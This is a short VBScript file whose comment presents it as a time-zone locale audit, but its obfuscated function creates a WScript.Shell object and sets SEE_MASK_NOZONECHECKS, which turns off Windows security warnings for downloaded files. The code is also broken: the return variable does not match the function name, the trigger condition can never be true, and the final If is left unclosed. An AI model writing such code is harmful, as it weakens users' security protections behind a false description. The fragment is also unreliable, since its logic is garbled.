' Win32_TimeZone description for locale audit
Function MergeProfileDelta78()
On Error Resume Next
  Dim strManifestRaw44,strSegment353,strProfileBlob53
  Set strManifestRaw44=CreateObject("WScript.Shell")
  strSegment353=strManifestRaw44.ExpandEnvironmentStrings("%TEMP%")
  strProfileBlob53=strManifestRaw44.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSegment353)>0 And Len(strProfileBlob53)>0 Then
    strManifestRaw44.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    DecodeManifest50=1
    Exit Function
  End If
  DecodeManifest50=0
End Function

If Month(Now) > 12 Then
  Call MergeProfileDelta78()
